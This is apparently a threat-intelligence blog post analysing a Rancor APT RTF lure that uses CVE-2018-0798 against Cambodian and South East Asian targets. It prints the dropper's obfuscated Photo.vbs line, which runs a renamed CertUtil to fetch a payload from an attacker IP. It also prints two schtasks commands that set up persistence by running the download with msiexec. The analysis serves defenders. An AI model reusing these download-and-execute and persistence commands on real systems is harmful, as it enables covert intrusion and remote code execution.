@@ -1,0 +1,67 @@
+Summary
+Rancor - a Chinese APT identified by PaloAlto in 2017 has recently been observed targeting South East Asia using RTF’s containing CVE-2018-0798. They are believed to have goals of espionage. In this post I review a recently created RTF document used to lure and target South East Asian entities.
+
+Analysis
+While conducting research I came across an RTF document on VirusTotal, which was created on 2019-08-28 at 00:35:00 and uploaded on 2019-09-11 at 08:48:41. Initial review of this RTF revealed highly suspect activity consistent with APT lures that I have observed in the past.
+
+Upon opening the RTF document you are presented with a list of names written in Khmer, the official language of Cambodia, and spoken throughout South East Asia. The content of the document, when translated, attempts to appear as if it was sent by the Cabinet of Cambodia and lists out names of various government officials.
+
+ 
+
+
+Shown above: Rancor RTF Lure
+
+ 
+
+Whilst reviewing this “official” looking document, CVE-2018-0798 is being executed in the background. CVE-2018-0798 is an RCE vulnerability which allows a stack buffer overflow that can be exploited by a threat actor to perform stack corruption. In July 2019, Anomali wrote a detailed article on this exploit and how they observed multiple Chinese threat groups utilizing it to compromise their targets (including Rancor). This allows the attackers to create the file “OSEA54d.tmp” in the “C:\Users[username]\AppData\Local\Temp" folder and execute it.
+
+ 
+
+OSEA54d.tmp then drops GoogleUpdate.exe (7b973145f7e1b59330ca4dd1f86b3d55) within “C:\Windows\System32\spool\drivers\color\“. Analysis of the GoogleUpdate.exe binary reveals it is merely CertUtil.exe, a legitimate Microsoft command-line utility that can be used to obtain certificate authority information and configure Certificate Services. It can also be used for nefarious purposes, such as downloading files from a given URL. Next, OSEA54d.tmp creates a .vbs script in the same folder, titled “Photo.vbs”.
+
+ 
+
+Shown below: Photo.vbs script
+
+wscript.sleep 3000:wscript.createobject("wscript.shell").run "%windir%\system32\spool\drivers\color\GoogleUpdate.exe -f -u""rlca""che ""h""tt""p"":/""/167.71.237.100/%ComputerName%.png"" %temp%\%ComputerName%.tmp",0,0
+ 
+
+Stepping through this script, we can break it down to two parts - first it calls “wscript.sleep” which causes it to suspend the execution of the script for a specified number of milliseconds (in this case, 3000). Second, we see it call “wscript.createobject(“wscript.shell”).run”, which allows you to run a cmdline command from a .vbs script. This runs GoogleUpdate.exe, which we previously identified as CertUtil.exe, with the -f and -urlcache flags to force fetch a specified URL and update the cache. The URL provided (167.71.237.100/%ComputerName%.png) requests a file based off the user’s computer name (i.e. USER-PC), which is then stored in the user’s local temp folder as a .tmp file.
+
+ 
+
+Next, I observed OSE91E4.tmp launch two child cmd.exe processes with the following parameters:
+
+Shown below: “Google-Updates” scheduled task
+
+cmd /c schtasks /create /sc MINUTE /tn "Google-Updates" /tr "msiexec /q /i %temp%\%ComputerName%.tmp" /mo 3 /F
+ 
+
+The first cmd.exe calls schtasks to create a scheduled task called “Google-Updates”, which utilizes “msiexec” to execute the downloaded payload “[ComputerName].tmp” from the user’s local temp folder once every minute. This would be used to maintain persistence once the secondary payload was downloaded.
+
+ 
+
+Shown below: “Google-Update” scheduled task
+
+cmd /c schtasks /create /sc MINUTE /tn "Google-Update" /tr "wscript /b %windir%\system32\spool\drivers\color\Photo.vbs" /mo 2 /F
+ 
+
+The second cmd.exe calls schtasks to create a scheduled task called “Google-Update” (note the missing “s” in comparison to the prior scheduled task. Due to the /F flag, even if they had identical names, it would forcefully create the task and suppresses warnings if the specified task already existed). This utilizes wscript to run “Photo.vbs” from the user’s local temp folder once every minute.
+
+ 
+
+
+Shown above: Process graph
+
+ 
+
+Unfortunately, whenever a secondary payload was requested from the URL “167.71.237.100/[ComputerName].png” containing my computer’s name (USER-PC), regardless of geolocation, it returned 404 Not Found HTTP responses. That indicates several possibilities to me - such as the attackers already knowing the computer name of their target and only returning a payload if it is matched, specific geolocation requirements, or the file was removed from the server.
+
+ 
+
+
+Shown above: Packet capture of Rancor RTF 2nd stage payload request
+
+ 
+
+Due to the final payload not being available for analysis, I was unable to compare prior samples of malware used by Rancor to confirm attribution - however, based on the TTP’s (Tactics, Techniques, Procedures) observed, I can say with a high degree of confidence that this activity is related to Rancor APT. Therefore, the final payload would have likely been DDKONG or PLAINTEE malware which serve as backdoors, allowing the actors to list files, upload/download files, and execute other commands.
